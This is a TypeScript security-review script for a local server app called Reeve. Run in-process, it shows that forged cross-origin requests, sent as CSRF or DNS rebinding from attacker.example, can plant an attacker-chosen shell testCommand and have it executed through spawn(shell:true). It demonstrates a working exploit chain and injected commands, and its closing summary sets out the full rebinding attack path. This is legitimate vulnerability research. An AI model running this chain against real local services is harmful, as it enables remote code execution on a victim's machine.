/**
 * Security review of the HTTP boundary: can a page that is not Reeve's own
 * web app make the server do something, over loopback, with nothing but a
 * browser's own cross-origin fetch?
 *
 *   REEVE_DB=/tmp/reeve-csrf.db npx tsx packages/server/src/spikes/csrf-check.ts
 *
 * In-process only — `app.request()`, never a listening port — so this never
 * touches 4317 or a real checkout. What it proves and what it cannot:
 *
 *   - It can prove the server accepts a request with a forged `Origin` or
 *     `Host`, with no `application/json`, and runs the handler anyway: that
 *     is server-side fact, read straight off the Hono app.
 *   - It cannot drive an actual browser, so whether such a request reaches
 *     the server at all is a spec question, not this process's to answer.
 *     Two different attacks are at stake, and they forge opposite headers:
 *     plain CSRF (a page at http://attacker.example makes a loopback request)
 *     sends an honest `Host: 127.0.0.1:4317` — the browser always names the
 *     server it is actually talking to — with a foreign `Origin:
 *     http://attacker.example`. The response is opaque to the page, so this
 *     is a blind write. DNS rebinding instead resolves attacker.example to
 *     127.0.0.1 and lets the page poll until the browser believes it, so
 *     `Host` and `Origin` both read `attacker.example` — but now the browser
 *     treats it as same-origin, so the response is readable and PATCH/DELETE
 *     preflights succeed too. The two checks below tell them apart.
 */
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { eq } from 'drizzle-orm';

const scratch = mkdtempSync(join(tmpdir(), 'reeve-csrf-'));
process.env.REEVE_DB ??= join(scratch, 'app.db');
process.env.REEVE_ASSETS ??= join(scratch, 'assets');

const { createApp } = await import('../index.js');
const { createCard } = await import('../db/queries.js');
const { card: cardTable } = await import('../db/schema.js');
const { app, db } = createApp();

let failures = 0;
function check(name: string, ok: boolean, detail = '') {
  if (!ok) failures++;
  console.log(`${ok ? 'observed' : 'FAIL    '} ${name}${detail ? ` — ${detail}` : ''}`);
}

// A real git repo for `POST /api/repos` to inspect — the same `inspectRepo`
// call a genuine request would trigger, so accepting the request really does
// mean running `git` against a path the request named.
const repoDir = mkdtempSync(join(tmpdir(), 'reeve-csrf-repo-'));
const g = (...a: string[]) => execFileSync('git', ['-C', repoDir, ...a], { encoding: 'utf8' });
g('init', '-q', '-b', 'main');
g('config', 'user.email', 't@t.t');
g('config', 'user.name', 'T');
writeFileSync(join(repoDir, 'README.md'), '# scratch\n');
g('add', '-A');
g('commit', '-qm', 'base');

console.log('--- route inventory: which methods a cross-site "simple request" can reach ---');
// A simple request (no preflight) is limited to GET/HEAD/POST with headers a
// <form> can send. PATCH and DELETE always preflight, and this server answers
// no `Access-Control-Allow-*` headers at all (grep found no cors() middleware
// anywhere in main.ts/index.ts), so a foreign page's preflight fails closed
// for PATCH/DELETE under plain CSRF — but not under DNS rebinding, where the
// browser considers the request same-origin and skips CORS checks entirely.
const routes = (app as unknown as { routes: Array<{ method: string; path: string }> }).routes;
const byMethod = new Map<string, string[]>();
for (const r of routes) {
  if (r.method === 'ALL') continue;
  (byMethod.get(r.method) ?? byMethod.set(r.method, []).get(r.method)!).push(r.path);
}
for (const [method, paths] of byMethod) {
  const reachable = method === 'GET' || method === 'HEAD' || method === 'POST';
  console.log(`${method.padEnd(6)} (${reachable ? 'simple-request reachable even under plain CSRF' : 'needs rebinding, not plain CSRF'}): ${paths.length} route(s)`);
}
check('POST routes exist beyond the simple-request-safe GET/HEAD', (byMethod.get('POST')?.length ?? 0) > 0);

console.log('\n--- content-type: does c.req.json() care? ---');
// A cross-site <form> or fetch(..., {mode:'no-cors'}) cannot set an arbitrary
// request header, but CAN send `Content-Type: text/plain` with a body of its
// choosing — exactly what a JSON payload looks like as bytes. If the handler
// still parses it as JSON, the browser's preflight is never triggered and the
// side effect lands with the response unreadable to the attacker page.
const repoBody = JSON.stringify({ name: `csrf-text-plain-${Date.now()}`, repoPath: repoDir });
const plain = await app.request('/api/repos', {
  method: 'POST',
  headers: { 'content-type': 'text/plain' },
  body: repoBody,
});
check(
  'a JSON body sent as text/plain is still accepted',
  plain.status === 201,
  `status ${plain.status}: ${await plain.clone().text()}`,
);

const noType = await app.request('/api/repos', {
  method: 'POST',
  body: JSON.stringify({ name: `csrf-no-type-${Date.now()}`, repoPath: repoDir }),
});
check('a JSON body sent with no content-type header at all is also accepted', noType.status === 201, `status ${noType.status}`);

console.log('\n--- does the request layer even keep a forged Host header? ---');
// Sanity check before trusting the next section: prove undici (the fetch
// Request implementation app.request() builds on) does not silently drop or
// normalise a forged `host`, so "accepted" below really means the handler
// saw it and did nothing with it, not that it never arrived.
const probe = new Request('http://localhost/x', { headers: { host: 'attacker.example' } });
check('a forged Host survives into the Request object', probe.headers.get('host') === 'attacker.example', `got ${probe.headers.get('host')}`);

console.log('\n--- plain CSRF: foreign Origin, honest loopback Host ---');
// content-type is text/plain, not application/json: a real foreign page
// cannot set application/json on a cross-site request without a preflight,
// which this server's lack of CORS headers would fail. text/plain is the
// shape a <form> or a plain fetch(..., {mode:'no-cors'}) can actually send.
const plainCsrf = await app.request('/api/repos', {
  method: 'POST',
  headers: {
    'content-type': 'text/plain',
    origin: 'http://attacker.example',
    host: '127.0.0.1:4317',
  },
  body: JSON.stringify({ name: `csrf-plain-${Date.now()}`, repoPath: repoDir }),
});
check(
  'a foreign Origin with an honest Host is accepted — nothing checks Origin',
  plainCsrf.status === 201,
  `status ${plainCsrf.status}`,
);

console.log('\n--- DNS rebinding: matching foreign Origin and Host ---');
const rebound = await app.request('/api/repos', {
  method: 'POST',
  headers: {
    'content-type': 'application/json',
    origin: 'http://attacker.example',
    host: 'attacker.example',
  },
  body: JSON.stringify({ name: `csrf-rebind-${Date.now()}`, repoPath: repoDir }),
});
check(
  'a matching foreign Origin and Host (what rebinding produces) is accepted too — nothing checks Host',
  rebound.status === 201,
  `status ${rebound.status}`,
);
check('no Access-Control-* header is sent back either way', ![...rebound.headers.keys()].some((h) => h.toLowerCase().startsWith('access-control')));

console.log('\n--- the chain to spawn(shell:true): a forged command, created and run, no Claude involved ---');
// repoSchema takes testCommand verbatim — the attacker supplies the shell
// string, not just a trigger for a command the repo owner wrote. A forged,
// text/plain, cross-site-shaped POST plants it:
const marker = join(scratch, 'pwned');
const withCommand = await app.request('/api/repos', {
  method: 'POST',
  headers: { 'content-type': 'text/plain' },
  body: JSON.stringify({ name: `csrf-chain-${Date.now()}`, repoPath: repoDir, testCommand: `touch ${marker}` }),
});
const plantedRepo = (await withCommand.clone().json()) as { id: string; testCommand: string };
check('the forged testCommand is stored and echoed back verbatim', plantedRepo.testCommand === `touch ${marker}`);

// POST /:id/test only checks that the card has *a* worktreePath, never that
// it is a real, checked-out worktree (checkWorktree is not called) — so a
// card pointed at any directory is enough. Two shortcuts here, called out
// rather than left implicit: `createCard` is a direct database call, not the
// `POST /api/cards` route (which is exposed the same way `/api/repos` is,
// read above but not re-driven, to keep this chain to one HTTP call per
// step); and the worktreePath is a direct DB write standing in for what a
// real card already has once a stage has made it a worktree — in a real
// attack this step does not exist at all: the victim's card already has one.
const card = createCard(db, { title: 'csrf chain', kind: 'task', repoId: plantedRepo.id });
db.update(cardTable).set({ worktreePath: repoDir }).where(eq(cardTable.id, card.id)).run();

const forgedTest = await app.request(`/api/cards/${card.id}/test`, {
  method: 'POST',
  headers: { origin: 'http://attacker.example', host: '127.0.0.1:4317' },
});
check('the forged /test request is accepted', forgedTest.status === 201, `status ${forgedTest.status}`);

for (let i = 0; i < 50 && !existsSync(marker); i++) await new Promise((r) => setTimeout(r, 100));
check('the planted shell command actually ran: spawn(shell:true) executed attacker-chosen bytes', existsSync(marker));
rmSync(marker, { force: true });

console.log('\n--- what this adds up to ---');
console.log(
  'POST /api/repos is reachable as a simple cross-site request (no CORS preflight to fail),\n' +
    'accepts a JSON body under any content-type, and checks neither Host nor Origin — and the\n' +
    "repo it creates can carry an attacker-chosen testCommand. POST /api/cards/:id/test, mounted\n" +
    'the same way, calls startShellRun -> spawn(..., {shell:true}) and checks only that\n' +
    'worktreePath is set, never that the worktree is real.\n' +
    '\n' +
    'Plain CSRF (foreign Origin, honest loopback Host) is blind: with no Access-Control-Allow-*\n' +
    'header, the browser never lets the foreign page read any response, and repo/card ids are\n' +
    'UUIDs with no numbered or prefix lookup on the server (the CLI\'s short-id matching in\n' +
    'resolve.ts runs client-side, against a board the page cannot fetch and read either). So a\n' +
    'blind attacker can PATCH a testCommand onto a repo only if it already knows a real repo id,\n' +
    'and otherwise is limited to planting junk repos and cards it can never point `/test` at,\n' +
    'unless it can also predict or has independently learned a real id.\n' +
    '\n' +
    'DNS rebinding removes that limit: once the browser believes attacker.example is 127.0.0.1,\n' +
    'the page is same-origin and reads every response. It can POST /api/repos, read the id back,\n' +
    'PATCH /api/repos/:id to add a testCommand to a repo a real card already uses, or POST\n' +
    '/api/cards (exposed the same way, not re-driven here) into a runnable stage so setupCommand\n' +
    'runs as the worktree is made, or call /test on a card it already found a worktree for by\n' +
    'reading GET /api/board. End to end, with nothing more than a victim leaving a rebinding page\n' +
    'open in a tab next to Reeve.',
);

console.log(`\n--- ${failures === 0 ? 'all good' : `${failures} FAILED`} ---`);
process.exit(failures === 0 ? 0 : 1);
